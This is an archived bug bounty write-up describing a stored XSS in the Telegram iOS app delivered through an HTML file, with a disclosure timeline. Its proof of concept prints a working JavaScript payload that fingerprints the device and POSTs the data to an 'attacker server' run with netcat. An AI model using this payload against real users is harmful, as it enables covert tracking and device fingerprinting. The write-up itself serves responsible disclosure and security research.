---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-07-16_write-up-telegram-bug-bounty-whatsapp-na-blind-xss-stored-ios-in-messengers-twin.md
original_filename: 2018-07-16_write-up-telegram-bug-bounty-whatsapp-na-blind-xss-stored-ios-in-messengers-twin.md
title: WRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers
  twins, who really care about your security?]
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- api-security
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- api-security
- mobile-security
language: en
raw_sha256: 4a875ab9e9c158f4635912b0d299b22e2c620b10e1345359cf039f1953ab84bc
text_sha256: d6afc9dc637f062fe89eabbb65ed804e7213ef7657cddd375614ad18fefda4d0
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# WRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers twins, who really care about your security?]

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-07-16_write-up-telegram-bug-bounty-whatsapp-na-blind-xss-stored-ios-in-messengers-twin.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, api-security, mobile-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `4a875ab9e9c158f4635912b0d299b22e2c620b10e1345359cf039f1953ab84bc`
- Text SHA256: `d6afc9dc637f062fe89eabbb65ed804e7213ef7657cddd375614ad18fefda4d0`


## Content

---
title: "WRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers twins, who really care about your security?]"
page_title: "TELEGRAM BUG BOUNTY – WHATSAPP N/A – BLIND XSS STORED IN IOS MESSENGERS – @omespino"
url: "http://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/"
final_url: "https://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/"
authors: ["Omar Espino (@omespino)"]
programs: ["Meta / Facebook"]
bugs: ["Blind XSS"]
publication_date: "2018-07-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5807
---

MOBILE$$$ USD[July 2018](/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/)

# TELEGRAM BUG BOUNTY – WHATSAPP N/A – BLIND XSS STORED IN IOS MESSENGERS

**Introduction  
** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about Telegram/Whatsapp bug bounty that is very great because this was my first Bitcoin bug bounty payment:

**[Note] the vulnerability was exactly the same so [It was accepted by Telegram but marked as N/A by Whatsapp (Facebook Whitehat team) ], I just going to describe the process once, also I called “Blind” XSS stored because I couldn’t get a popup alert, but the javascript code rendered anyway.**

**Title** Blind XSS Stored on Telegram app (iOS) via html file.  
**Product / URL: ​** Telegram iOS app

**Description and Impact​:**  
​The attackers can store and render arbitrary HTML/Javascript code via HTML file in the background since Telegram iOS doesn’t sanitize any code in the webview inside the app.

**In this case the impact is:**  
– The attacker can know when the user read the message and when was the last user online activity even if is “last seen” and “read receipts” are turned off.  
– The attacker can fingerprint the user device with navigator object that contains interesting info from the user device, iOS version, iOS device, language  
– The attacker can get the victim IP and at least know what is current user city location with any service online like https://www.elhacker.net/geolocalizacion.html

**POC**

1.- “As attacker”: Login to your Telegram account in any client and upload a html file with the following content and send it via message (ggwp.htm file attached):

ggwp.html file content (transcript):
  
  
  <!-- script that load a firebug lite version to get the webview debuggin console inside the app -->
  <script src='https://getfirebug.com/firebug-lite-debug.js'></script>
  <script>
  // iterating the navigator object that contain interesting info from the user device, iOS version, iOS device, language
  var nav = {};
  for (var property in navigator) {
  nav[property] = navigator[property];
  }
  // tracking when the user open the file with the date
  var d = new Date();
  var nav_formated = '<pre><h1>'+ document.location + '</h1><h2>' + d + ','+ JSON.stringify(nav, null, 2) + '</h2><pre>';
  // writting the results
  document.write(nav_formated);
  // send data to the 'attacker server'
  send_response(nav_formated);
  function send_response(response){
  var o_req = new XMLHttpRequest();
  o_req.open('POST','http://192.168.1.120:8090');
  o_req.send(response);
  }
  </script>

2.- Run the “attacker server” and wait for the victim open the file (in my case was my own computer in my lan with the IP 192.168.1.120 and run the server with nc -lvvv 8090)

3.- “As victim”: open the file in Telegram iOS and see the results that the victim just sent to the “attacker sever”

– The document.location  
– The navigator object

Note: Also you can notice that the Firebug lite debug console renders without any problem and is fully functional.

4.- “As attacker”: see the results caught in the “attacker sever”

[![](/assets/images/2018/07/telegram_iOS_blind_XSS_stored.webp)](/assets/images/2018/07/telegram_iOS_blind_XSS_stored.webp)

**Environment** \- iPhone 6 – iOS v11.2.5.  
\- iPhone 7 – iOS v11.2.6  
\- Telegram iOS app Version 4.7.1  
\- My personal account and the server was “hosted” in my own LAN.

**Tools:** Any unix like terminal with​ netcat installed  
**Is this bug public or known by third parties?​:** No​

**Can I reproduce this issue every time?** Yes  
**How did I find this bug?** Manually / Other

**Summarizing** , this clearly demonstrates how these companies manage this kind of vulnerabilities, in the one hand Telegram demonstrates actually how they worry about the user fingerprinting and Facebook demonstrated that don’t care.

PS. here part of my conversation with Facebook whitehat team.

[![](/assets/images/2018/07/omespino_facebook_conversation.webp)](/assets/images/2018/07/omespino_facebook_conversation.webp)

**Timeline:**  
22 Mar 2018: Initial report (Both platforms)  
26 Mar 2018: Telegram Security team member send me a response:

“Thank you very much for taking an interest in what we do and finding this issue. It will be fixed in the upcoming release. We would like to award you with a bounty of EUR **** for helping us identify it. I’m cc-ing ******* who will help you collect. “

26 Mar 2018: Facebook Security team member ask me for more details.  
26 Mar 2018: I replied Facebook Security team with more details.  
29 Mar 2018: Facebook Security team closed as N/A.  
10 Apr 2018: I got the Bitcoin transfer from Telegram Security team. [Profit]  
sometime in July 2018: Telegram iOS app fixed so I decided to make public this patched vulnerability.

well that’s it, share your thoughts, what do you think about how they handle that security issue? if you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[](/write-up-lovestory-from-closed-as-informative-to-xx00-usd-in-yahoo-ios-mail-app/)

[](/write-up-twitter-bug-bounty-my-1st-bugbounty-poodle-sslv3-bug-on-multiple-twitter-smtp-servers/)
